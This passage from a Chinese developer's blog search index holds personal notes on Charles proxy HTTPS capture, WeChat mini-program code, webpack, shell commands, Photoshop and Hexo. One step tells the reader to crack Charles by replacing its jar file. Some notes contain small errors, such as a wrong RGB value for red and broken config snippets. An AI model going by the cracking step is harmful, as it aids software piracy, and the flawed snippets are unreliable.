Local..关闭或删除对应映射</span><br></pre></td></tr></table></figure>\n<h2 id=\"如何抓取chrome浏览器请求\"><a href=\"#如何抓取chrome浏览器请求\" class=\"headerlink\" title=\"如何抓取chrome浏览器请求\"></a>如何抓取chrome浏览器请求</h2><p>设置代理，ifconfig查看对应的ip，<br>在Charles设置中设置对应端口</p>\n<ul>\n<li>step1</li>\n</ul>\n<p>自动代理设置为：</p>\n<p><code>http://127.0.0.1:8888/proxy.pac</code></p>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190316_288g40j79j72lfbgf1akk55khf3bf_640x488.png\" alt=\"\"></p>\n<ul>\n<li>step2</li>\n</ul>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190316_5i9b93b8aek34lfe4jcj0g892ejc7_592x505.png\" alt=\"\"></p>\n<ul>\n<li>step3</li>\n</ul>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190719_1lb012c5ijc73kafkjg8502i61h6a_708x806.png\" alt=\"\"></p>\n<h2 id=\"ios安装后开启证书信任\"><a href=\"#ios安装后开启证书信任\" class=\"headerlink\" title=\"ios安装后开启证书信任\"></a>ios安装后开启证书信任</h2><p>设置=&gt;通用=》关于手机=》证书信任设置</p>\n<h2 id=\"charles配置\"><a href=\"#charles配置\" class=\"headerlink\" title=\"charles配置\"></a>charles配置</h2><ol>\n<li>首先下载charles，并破解。如果替换jar后，提示软件损坏无法打开，提升用户权限可解决当前问题</li>\n<li>proxy=&gt;proxy settings=&gt;proxies选项 设置http port为8888，macOs选项设置Use HTTP proxy选项</li>\n<li>proxy=&gt;SSL Proxying Setting=&gt;SSL proxying选项，添加*:443信任https端口，或双星</li>\n<li>Help=&gt;SSL Proxying=&gt;install charles Root certificase,进行证书安装</li>\n<li>安装完成后双击证书，从弹窗里第一个选项选择始终信任</li>\n<li>wifi=&gt;open network preferences=&gt;advanced=&gt;proxies选项，勾选web proxy、secure web proxy选项，并设置主机名和端口分别为127.0.0.1和8888</li>\n<li>如果chrome任然提示不安全，无法进行网页访问，设置chrome代理为系统代理</li>\n<li>将手机与电脑连接同一wifi，通过wifi查看当前主机ip地址，和端口默认8888，设置手机wifi代理，将代理主机和端口进行填写</li>\n<li>填写完成后，通过Help=&gt;SSL Proxying=&gt;install mobile… 查看提示信息，进行证书安装。连接电脑代理后chls.pro/ssl，进入该页面。下载完证书后，将证书后缀名修改为charles.crt</li>\n<li>安装完成后，charles可以截取mobile网络请求</li>\n</ol>\n<h2 id=\"localhost无法抓取\"><a href=\"#localhost无法抓取\" class=\"headerlink\" title=\"localhost无法抓取\"></a>localhost无法抓取</h2><p>使用<code>localhost.charlesproxy.com</code>代替</p>\n<p>若各项配置正常，charles任然不能正常抓取请求，将网络代理中的配置文件删除<br><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190904_47251g7iicbc3598ihdib8j8ch2k8_1304x1012.png\" alt=\"\"></p>\n","categories":["tool"],"tags":["charles"]},{"title":"文档汇总","url":"http://zhoushaw.github.io/2017/10/14/other/tool/document-summary/","content":"<div><a id=\"more\"></a></div>\n\n<h2 id=\"找工作类\"><a href=\"#找工作类\" class=\"headerlink\" title=\"找工作类\"></a>找工作类</h2><ul>\n<li><a href=\"https://github.com/zhoushaw/Front-end-Web-Development-Interview-Question\" target=\"_blank\" rel=\"noopener\">前端面试题1</a></li>\n<li><a href=\"https://github.com/zhoushaw/FE-interview\" target=\"_blank\" rel=\"noopener\">前端面试题2</a></li>\n</ul>\n<h2 id=\"学习资源汇总\"><a href=\"#学习资源汇总\" class=\"headerlink\" title=\"学习资源汇总\"></a>学习资源汇总</h2><p><a href=\"https://github.com/zhoushaw/Awsome-Front-End-learning-resource\" target=\"_blank\" rel=\"noopener\">Front-End-learning-resource</a></p>\n<h2 id=\"工具类\"><a href=\"#工具类\" class=\"headerlink\" title=\"工具类\"></a>工具类</h2><p><a href=\"https://tinyjpg.com/\" target=\"_blank\" rel=\"noopener\">图片压缩平台</a></p>\n","categories":["tool"],"tags":["document"]},{"title":"微信小程序开发","url":"http://zhoushaw.github.io/2017/09/26/learning/font-end/wechat/wechat/","content":"<p><span><a id=\"more\"></a></span></p>\n<h2 id=\"事件处理\"><a href=\"#事件处理\" class=\"headerlink\" title=\"事件处理\"></a>事件处理</h2><p>bindtouchmove:监听拖拽事件，回调函数的参数可以访问到，物体的位置等信息，<br>通过提供的pageX，clientX等参数控制物体位置，实现拖拽</p>\n<h2 id=\"动画\"><a href=\"#动画\" class=\"headerlink\" title=\"动画\"></a>动画</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;view animation=<span class=\"string\">\"&#123;&#123;animationData&#125;&#125;\"</span> style=<span class=\"string\">\"background:red;height:100rpx;width:100rpx\"</span>&gt;&lt;/view&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">创建一个动画实例animation。调用实例的方法来描述动画。</span><br><span class=\"line\">最后通过动画实例的<span class=\"keyword\">export</span>方法导出动画数据传递给组件的animation属性。</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//设置动画过程信息</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> animation = wx.createAnimation(&#123;</span><br><span class=\"line\">  duration: <span class=\"number\">1000</span>,</span><br><span class=\"line\">    timingFunction: <span class=\"string\">'ease'</span>,</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">animation.scale(<span class=\"number\">2</span>,<span class=\"number\">2</span>).rotate(<span class=\"number\">45</span>).step()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">this</span>.setData(&#123;</span><br><span class=\"line\">  animationData:animation.export()</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"小程序缺陷\"><a href=\"#小程序缺陷\" class=\"headerlink\" title=\"小程序缺陷\"></a>小程序缺陷</h2><blockquote>\n<p>input 框问题<br>input 设置了placeholder之后，会出现层次问题<br>使用placeholder-class,并设置z-inde:0;</p>\n</blockquote>\n<blockquote>\n<p>多层跳转</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> Routeswitch= <span class=\"function\">(<span class=\"params\">router,success,error</span>)=&gt;</span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">var</span> app = getApp();</span><br><span class=\"line\">  <span class=\"keyword\">var</span> canSwitch = app.globalData.Routeswitching;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (canSwitch) &#123;</span><br><span class=\"line\">    app.globalData.Routeswitching = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    wx.navigateTo(&#123;</span><br><span class=\"line\">      url: router,</span><br><span class=\"line\">      success:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        success?success():<span class=\"string\">''</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      error: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        error?error():<span class=\"string\">''</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      complete: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">          app.globalData.Routeswitching = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;, <span class=\"number\">500</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","categories":["wechat"],"tags":["wechat"]},{"title":"webpack打包工具","url":"http://zhoushaw.github.io/2017/08/06/learning/font-end/webpack/webpack/","content":"<div><a id=\"more\"></a></div>\n\n\n<h2 id=\"webpack环境配置\"><a href=\"#webpack环境配置\" class=\"headerlink\" title=\"webpack环境配置\"></a>webpack环境配置</h2><p>npm install webpack –save-dev<br>npm install -g webpack</p>\n<p>npm install vue –save<br>npm install vue-loader –save-dev<br>会自动安装vue-compiler和css-loader<br>npm install style-loader<br>npm install babel-loader –save-dev<br>会自动安装babel-core<br>npm install babel-preset-es2015 –save-dev<br>npm install babel-preset-stage-0 –savedev</p>\n<p>npm install babel-plugin-transform-runtime –save-dev</p>\n<p>如果不使用他，自己定义的函数，被多次使用，就会每次在使用这个函数的时候，就会被打包一次，使用了transform-runtime可以解决多余的代码<br>解决全局函数的污染，因为全局函数需要单独生成函数本省实现</p>\n<p>缺点是:<br>1.无法解决实例的方法，实例的方法需要借助polyfile</p>\n<p>使用:跟babelrc文件中使用，第二种，在packconfig.js中配置<br>{<br>    “pre<br>    “plugins”:[‘transform-runtime’]<br>}<br>npm install</p>\n<p>去了解vue的运行时构建错误<br>alias:别名<br>resolve:{<br>    alias:{<br>        ‘vue$’:’vue/dist/vue.common.js’<br>    }</p>\n<p>}</p>\n<p>用来在webpack中打包css、vue文件(加载器)<br>css-loader、:用于解决css调用引入问题<br>vue-loader<br>file-loader:用于处理css链入的外部文件处理<br>url-loader:在file-loader的基础上进行了扩展,增加了文件转化base编码功能</p>\n<h2 id=\"webpack-config配置\"><a href=\"#webpack-config配置\" class=\"headerlink\" title=\"webpack.config配置\"></a>webpack.config配置</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports=&#123;</span><br><span class=\"line\">\tentry:<span class=\"string\">''</span>,</span><br><span class=\"line\">\toutput:&#123;&#125;,</span><br><span class=\"line\">\t<span class=\"built_in\">module</span>:&#123;&#125;,</span><br><span class=\"line\">\tplugins:[]</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"entry\"><a href=\"#entry\" class=\"headerlink\" title=\"entry\"></a>entry</h3><p>注意事项:</p>\n<ul>\n<li><ol>\n<li>entry参数:配置入口文件参数，可以放多入口文件</li>\n</ol>\n</li>\n<li><ol>\n<li>一般将源文件放在src文件夹中</li>\n</ol>\n</li>\n</ul>\n<p>entry:”./a.js”                        :把当前目录下的a.js打包成bundle.js,打包入口文件，一定要写好相对路径，不能直接写文件名<br>entry:[“./src/a.js”,”./src/b.js”]    :这里表示有一个出口文件，并且这个文件对应两个js文件(多文件入口，单文件出口)<br>entry:{<br>    output1:’./src/a.js’,<br>    output2:[‘./src/b.js’,’./src/c.js’]<br>},</p>\n<h3 id=\"output\"><a href=\"#output\" class=\"headerlink\" title=\"output\"></a>output</h3><p>output:{                            :这里指产生两个出口文件，并且对应了(多文件入口多文件出口)<br>    filename:’[name].js’,<br>    path:__dirname+’/dist’<br>}<br>filename        :表示对应的出口文件名，不输入文件名默认为哈希值,’[name].js]’表示以源文件名进行输出(如果是多文件入口是，并且给文件对应加了名字，最终就是在入口文件设置的名字)<br>path            :表示输出的文件存放的位置,这个路径的位置</p>\n<h4 id=\"path\"><a href=\"#path\" class=\"headerlink\" title=\"path\"></a>path</h4><p>path文件夹的位置确定的方式:<br>源文件中的路径是:’../images/big.jpg’</p>\n<ul>\n<li>最后生成的路径是:’images/big.jpg’</li>\n<li>filel-loader在解析生成url路径时，的参照路径是配置文件中的output中的path的值:’demo4/dist’,最后生成了’demo4/images/big.jpg’,demo4本身是根目录，把这个路径最终进行简化就是/images/big.jpg</li>\n<li></li>\n<li>根据上面的原理我们按一下过程分布:</li>\n<li>1.源文件中的路径是:’../images/big.jpg’;</li>\n<li>2.真正要使用的图在路径是:’/dist/images/big.jpg’;</li>\n<li></li>\n<li>3.从1.2我们可以知道,index.html中要使用图片路径应该是:’/dist/images/big.jpg’;</li>\n<li>4.综上参考路径应该是’/dist/‘</li>\n<li>5.将file-loader的publicPath设为’./dist’,表示告诉file-loader吧源文件中的路径中的相对定位入’../直接去掉，然后白身下的直接拼在一起./dist后面，就成了/dist/images/big.jpg’</li>\n</ul>\n<h3 id=\"module\"><a href=\"#module\" class=\"headerlink\" title=\"module\"></a>module</h3><p>在module参数里面配置，webpack打包时候所需要的插件,每个加载的对象:第一个参数:配置要对什么类型的文件，第二个参数:用什么样的模块去加载<br>webpack1.x写法<br>loaders:[<br>    //当遇到文件名为.css结尾的文件去加载css-loader模块<br>    //管道pipe，从右往左执行对应的，将css-loader中的内容，通过style-loader将内容放到页面的style头部中<br>    {test:/.css$/,loader:’style-loader!css-loader’},<br>],<br>webpack2.x写法<br>rules:[<br>    //数组写法也需要是pipe的写法<br>    {test:/.css$/,use:[‘style-loader’,’css-loader’]}<br>]</p>\n<p>url-loader模块，比file-loader模块了一个base编码功能，可以设置大小，小于多少的变成base编码,减少请求数据<br>{<br>    test:/.(gif|jpg|png|svg|jpe?g)$/,<br>    //loader:’file-loader?name=[name].[ext]&amp;outPath=/images/‘<br>    loader:’url-loader’,<br>    options:{<br>        // 如果小于base64位编码，把图片变成base编码<br>        limit:8192,<br>        //没有配置名字默认使用哈希值来命名、使用这种命名规范，打包成文件之后，采用以前的命名规则，name名字ext后缀名<br>        name:’[name].[ext]’,<br>        //在输出之前，在这个文件名前面在加一个路径，用于区分文件存放<br>        outputPath:’/images/‘,<br>        // 此处要给相对于output配置的一个相对路径<br>        publicPath:’dist’<br>    }<br>},<br>上面的loader加载方式是以前的方法,新版方法</p>\n<p>{</p>\n<pre><code>test:/\\.(gif|jpg|png|svg|jpe?g)$/,\nuse:{\n    loader:&apos;url-loader&apos;,\n    options:{\n        limit:8192,\n        name:&apos;[name].[ext]&apos;,\n    }\n}\n</code></pre><p>}</p>\n<h3 id=\"plugins\"><a href=\"#plugins\" class=\"headerlink\" title=\"plugins\"></a>plugins</h3><p>扩展插件使用:<br>plugins:[<br>    new webpack.optimize.UglifyJsPlugin({<br>        compress:{warnings:false}<br>    }),<br>    /<em>偷懒自动生成测试用html，而且这个html会自动应用我们生成的bundle.js文件</em>/<br>    new HtmlwebpackPlugin({title:’test’}),<br>    //热模块替换插件<br>    new webpack.HotModuleReplacementPlugin()<br>]</p>\n<p>new webpack.optimize.UglifyJsPlugin:使用webpack里面自带的UglifyJs压缩插件，对文件进行压缩<br>这种使用情况需要导入webpack，才能使用</p>\n<p>new UglifyJsPlugin({compress:{warning:false}}):单独下载了UglifyJsPlugin插件</p>\n<p>HtmlwebpackPlugin:会将当前导出的所有文件路径引入到自动生成的一个html中，进行测试使用<br>引入:webpack-dev-server插件才能使用:<br>默认情况下不开启热替换(热替换的优势，在于对修改的内容进行替换，提高性能，不开启热替换，会全局替换，耗性能)<br>HotModuleReplacementPlugin:在修改文件之后，进行了保存操作，会触发保存在内存中，使用的数据，</p>\n<p>启动webpack服务，可以将命令行保存在package.js中，使用npm run dev启动webpack-sev-server,并且开启一个express微型服务器，用来测试，当前的运行网站的状态</p>\n<p>“build”:”node_modules\\.bin\\webpack –watch”,    启动webpack，并且实时监测当前文件的状态，如果发生改变就对导入的文件重新打包,监测除了webpack.config.js以外的文件<br>“dev”:”node_modules\\.bin\\webpack-dev-server –inline”    启动webpack-dev-server,并实时监测当前文件的状态，如果发生改变就刷新服务器上的页面</p>\n<h2 id=\"babel\"><a href=\"#babel\" class=\"headerlink\" title=\"babel\"></a>babel</h2><p>rules{</p>\n<pre><code>use:{\n    test:/\\.js$/,\n    use:[&quot;babel-loader&quot;],\n    options:{\n\n    }\n    exclude:&apos;/node_modules/&apos;\n}\n</code></pre><p>}</p>\n","categories":["js"],"tags":["nodejs"]},{"title":"linux命令行","url":"http://zhoushaw.github.io/2017/06/12/other/linux-command/","content":"<div><a id=\"more\"></a></div>\n\n<h2 id=\"文件常见操作\"><a href=\"#文件常见操作\" class=\"headerlink\" title=\"文件常见操作\"></a>文件常见操作</h2><p>创建目录                        make directory                            mkdir file1<br>删除                                remove                                         rm -rf file1<br>移动 / 重命名                move                                             mv file2 file3<br>复制                                copy                                              cp<br>罗列                                list                                                  ls<br>链接                                link                                                 ln *</p>\n<h2 id=\"显示系统的隐藏文件方法\"><a href=\"#显示系统的隐藏文件方法\" class=\"headerlink\" title=\"显示系统的隐藏文件方法:\"></a>显示系统的隐藏文件方法:</h2><blockquote>\n<p>在终端上输入:</p>\n</blockquote>\n<p>defaults write com.apple.finder AppleShowAllFiles TRUE; killall Finder</p>\n<blockquote>\n<p>即为显示隐藏文件:</p>\n</blockquote>\n<p>如果不要显示系统的这些隐藏文件，修改后面的true为false就好:<br>defaults write com.apple.finder AppleShowAllFiles FALSE; killall Finder</p>\n<p>前后端统一使用Base64 -&gt; AES (key&gt;:keyname, iv:ivnum) -&gt; gzip的方式来，进行加密、解密。来确保数据安全</p>\n<p>ifconfig ip地址查询</p>\n<p>一、使用新的端口:<br>  1.aides dev –port 8800，把-p后面的8800改成您要自定义的端口号</p>\n<p>二、关闭被占用的端口:<br>  1.查看使用8800端口的进程方法:lsof -i :8800<br>  2.关闭使用某端口的进程方法:kill -9 PID，注:PID是进程ID</p>\n<h2 id=\"文件常见操作-1\"><a href=\"#文件常见操作-1\" class=\"headerlink\" title=\"文件常见操作\"></a>文件常见操作</h2><blockquote>\n<p> 显示系统版本</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat  /etc/redhat-release</span><br></pre></td></tr></table></figure>\n<h2 id=\"显示当前cenos系统版本\"><a href=\"#显示当前cenos系统版本\" class=\"headerlink\" title=\"显示当前cenos系统版本\"></a>显示当前cenos系统版本</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /etc/redhat-release</span><br></pre></td></tr></table></figure>\n","categories":["command"],"tags":["linhux"]},{"title":"photoshop","url":"http://zhoushaw.github.io/2017/05/27/other/tool/photoshop-note/","content":"<div><a id=\"more\"></a></div>\n\n<h2 id=\"取色板\"><a href=\"#取色板\" class=\"headerlink\" title=\"取色板\"></a>取色板</h2><pre><code>快捷键:(i)\n前景色/背景色: 快捷键（x）\n拾色器: 左键单击前景色/背景色\n</code></pre><h3 id=\"颜色代码类型\"><a href=\"#颜色代码类型\" class=\"headerlink\" title=\"颜色代码类型:\"></a>颜色代码类型:</h3><p>1.英文单词<br>2.十六进制: 0-9 a-f （#123abf，#333，#124） –#数字/者字母<br>3.三原色</p>\n<h4 id=\"十六进制表示法\"><a href=\"#十六进制表示法\" class=\"headerlink\" title=\"十六进制表示法\"></a>十六进制表示法</h4><p>图像是由三种颜色组成:红、绿、蓝，由六位颜色值组成<br>红:#ff0000     绿:#00ff00     蓝:#0000ff<br>黑:#000000    白:#ffffff </p>\n<p>（#000 = #000000,#fff = #ffffff,#333333 = #333,#112244 = #112244)</p>\n<p>红+绿=黄 ffff00<br>红+蓝=紫 ff00ff<br>红+绿+蓝=白色<br>黑（三原色都没）</p>\n<h4 id=\"rgb表示法\"><a href=\"#rgb表示法\" class=\"headerlink\" title=\"rgb表示法\"></a>rgb表示法</h4><p>rgb（0，0，0） 数值: 0-255<br>r:red     g:green         b:blue<br>白:rgb（255，255，255）<br>黑:rgb（0，0，0）<br>红:rgb（255，255，0）<br>蓝:rgb（0，0，255）</p>\n<h4 id=\"rgba表示法\"><a href=\"#rgba表示法\" class=\"headerlink\" title=\"rgba表示法\"></a>rgba表示法</h4><p>a:alpha(透明度)<br>取值范围:0-1</p>\n<p>####常用快捷键，及功能打开</p>\n<p>1.网页的效果图，单位:px（像素）<br>2.显示器的分辨率:72px，<br>平面设计（印刷）:企业宣传册、画册、海报。。。。:分辨率300px<br>3.psd<br>4.ctrl+鼠标左键，可以选择对应的图层。不过必须在，选择工具栏的，自动选择框，去勾。<br>5.快捷键切换工具:<br>v:移动工具<br>m:选框工具<br>g:油漆桶<br>快捷键切换: shift+工具快捷方式<br>6.标尺的打开:ctrl+r。右击标尺，可以切换单位<br>7.正方形绘制:shrit+鼠标左键<br>8.取消选区:ctrl+d<br>9.alt+del前景色，ctrl+del背景色<br>10.图层合并:ctrl+E<br>11.打开图片大小窗口:ctrl+alt+i<br>12.查看指定区域大小，矩形选框工具<br>13.复制对应图层对的对象，ctri+鼠标左键点击图层的缩略图，就可以选中对应图层里面的对象<br>14.ctrl+z，恢复上一步</p>\n<p>如何打开对应的面板:—点击菜单:窗口-&gt;选择对应的任何窗格</p>\n<p>画布颜色:右击画布，可以改变画布颜色</p>\n<p>显示器像素72px</p>\n<h3 id=\"图片保存格式\"><a href=\"#图片保存格式\" class=\"headerlink\" title=\"图片保存格式\"></a>图片保存格式</h3><p>JPG:人物，风景、实物图、开通图片、3D效果图。。</p>\n<p>GIF:LOGO、图标、按钮、透明、动画。。。</p>\n<p>PNG:LOGO、图片、按钮、透明、半透明。。</p>\n<h2 id=\"通道抠图\"><a href=\"#通道抠图\" class=\"headerlink\" title=\"通道抠图\"></a>通道抠图</h2><p>图层窗口-&gt;新增通道副本-&gt;图像-&gt;调整-&gt;色阶</p>\n<p>图像-&gt;调整-&gt;反向</p>\n<p>图层-&gt;</p>\n<p>1.RGB通道,选择黑白对比强烈通道 R/G/B<br>2.图像-&gt;调整(色阶、曲线){黑白对比加深}<br>3.画笔        {需要/不需要 黑白完全对比}<br>5.Ctrl选中副本缩览图<br>6.显示正常的颜色模式</p>\n<h2 id=\"切片工具\"><a href=\"#切片工具\" class=\"headerlink\" title=\"切片工具\"></a>切片工具</h2><p>保存时可以选择保存选择的</p>\n<h2 id=\"小方格背景\"><a href=\"#小方格背景\" class=\"headerlink\" title=\"小方格背景\"></a>小方格背景</h2><p>可以使用:右击图层-&gt;混合模式-&gt;图层叠加-&gt;选择图片</p>\n<p>##使用高斯模糊来制作渐变</p>\n<p>先放好背景色-&gt;滤镜-&gt;高斯模糊.设置好模糊程度<br>如果需要凸显文字还可在背景色上做一个放一个图层，填对比色强，降低透明度，再在上面建一个文字，就有对比强的表现</p>\n<p>##光源</p>\n<p>混合选项里面的阴影:使用全局光</p>\n","categories":["other"],"tags":["ps"]},{"title":"sublime配置","url":"http://zhoushaw.github.io/2017/05/23/other/tool/sublime-config/","content":"<div><a id=\"more\"></a></div>\n\n<h2 id=\"常用插件\"><a href=\"#常用插件\" class=\"headerlink\" title=\"常用插件:\"></a>常用插件:</h2><p>SyncedSidebarBg: 使sublime侧边文件显示栏，跟主题同色<br>Side​Bar​Enhancements: 侧边文件管理增强</p>\n<p>主题:alpenglow</p>\n<p>设置-用户设置:</p>\n<pre><code>&quot;tabs_small&quot;: true,\n&quot;theme&quot;: &quot;Afterglow-magenta.sublime-theme&quot;\n</code></pre><p>设置显示主题icon，</p>\n<p>LiveReload: 跟chrom同步刷新网页</p>\n<p>BracketHighlighter:设置选中同tag</p>\n<p>colorPicker:颜色板选择颜色器</p>\n<p>markdownEditing: markdown语法高亮</p>\n<p>fileIcons、LESS、scheme、afterglow、typescript、vuejs syntax,select theme</p>\n<h2 id=\"windows常用操作命令\"><a href=\"#windows常用操作命令\" class=\"headerlink\" title=\"windows常用操作命令:\"></a>windows常用操作命令:</h2><p>快速回到桌面:win+d<br>炫酷切换任务窗口:win+tab,alt+tab<br>运行: win+R<br>退出:esc<br>关闭窗口: alt+f4<br>资源管理器:win+e<br>重名名:f2</p>\n<p>ddd<br>快捷键:</p>\n<p>新建:ctrl+N<br>保存:ctrl+s<br>查找:ctrl+F<br>替换:ctrl+H<br>html基本构造:!+tab，html:5+tab</p>\n<p>同样的标签快速生成:<br>li*10会生成10个li</p>\n<p>ul&gt;li*10+tab会生成ul，在里面生成10li</p>\n<p>选中多个对象同时编辑:<br>shift+鼠标右键，下拉。光标会出现在多个对象编辑区，输入即可</p>\n<p>选中同样对象:<br>双击对象，每次按ctrl+d会选中同样对象；</p>\n<p>注释:ctrl+/<br>将前面行注释，选中对象注释</p>\n<p>缩进:tab</p>\n<p>多行缩进: ctrl+【，ctrl+】<br>换行缩进: ctrl+shift+回车</p>\n<p>原样粘贴:</p>\n<p>ctrl+shift+v</p>\n","categories":["other"],"tags":["sublime"]},{"title":"Hexo折腾记","url":"http://zhoushaw.github.io/2017/04/29/other/build blog/Hexo-note/","content":" <div><a id=\"more\"></a></div>\n\n<h2 id=\"搭建hexo\"><a href=\"#搭建hexo\" class=\"headerlink\" title=\"搭建hexo\"></a>搭建hexo</h2><p><a href=\"https://xuanwo.org/2015/03/26/hexo-intor/\" target=\"_blank\" rel=\"noopener\">hexo搭建参考文章</a><br>搭建要使用ssh秘钥链接</p>\n<h2 id=\"高亮代码显示\"><a href=\"#高亮代码显示\" class=\"headerlink\" title=\"高亮代码显示\"></a>高亮代码显示</h2><p>语法格式<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(```c)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> main();</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> (```)</span><br></pre></td></tr></table></figure></p>\n<p>这样的写法才能显示出高亮的代码，并且附带行数，给hexo主题去解析去掉括号</p>\n<h2 id=\"增加hexo，热更新\"><a href=\"#增加hexo，热更新\" class=\"headerlink\" title=\"增加hexo，热更新\"></a>增加hexo，热更新</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">npm install hexo-browsersync --save</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://github.com/hexojs/hexo-browsersync\" target=\"_blank\" rel=\"noopener\">browersync插件</a></p>\n<h3 id=\"站点文件-config-yml中配置\"><a href=\"#站点文件-config-yml中配置\" class=\"headerlink\" title=\"站点文件_config.yml中配置\"></a>站点文件_config.yml中配置</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight:</span><br><span class=\"line\">  enable: <span class=\"literal\">true</span></span><br><span class=\"line\">  line_number: <span class=\"literal\">true</span></span><br><span class=\"line\">  auto_detect: <span class=\"literal\">true</span></span><br><span class=\"line\">  tab_replace:</span><br></pre></td></tr></table></figure>\n<h3 id=\"themes文件-config-yml中配置\"><a href=\"#themes文件-config-yml中配置\" class=\"headerlink\" title=\"themes文件_config.yml中配置\"></a>themes文件_config.yml中配置</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">highlight_theme: night eighties<span class=\"comment\">//看主题提供了什么样的格式</span></span><br></pre></td></tr></table></figure>\n<p>这样子就完成了配置</p>\n<h2 id=\"hexo主题默认a标签带下划线\"><a href=\"#hexo主题默认a标签带下划线\" class=\"headerlink\" title=\"hexo主题默认a标签带下划线\"></a>hexo主题默认a标签带下划线</h2><p>因为hexo默认的是a标签带border-bottom:black样式，所以在文章中要使用border-bottom: none；样式来清除自带的属性</p>\n<p>blog\\themes\\next\\source\\css_common\\components\\sidebar\\sidebar.sty<br>中可以设置友链接的下划线</p>\n<h2 id=\"为Hexo-Next主题添加哈林摇特效\"><a href=\"#为Hexo-Next主题添加哈林摇特效\" class=\"headerlink\" title=\"为Hexo Next主题添加哈林摇特效\"></a>为Hexo Next主题添加哈林摇特效</h2><p><a href=\"http://www.iamlj.com/2016/08/add-special-effect-harlem-shake-for-hexo/\" target=\"_blank\" rel=\"noopener\">添加哈林摇特效,原作地址</a></p>\n<h2 id=\"博客的搜索插件\"><a href=\"#博客的搜索插件\" class=\"headerlink\" title=\"博客的搜索插件\"></a>博客的搜索插件</h2><p>可以去next官方文档查看</p>\n<h2 id=\"git，部署常用命令\"><a href=\"#git，部署常用命令\" class=\"headerlink\" 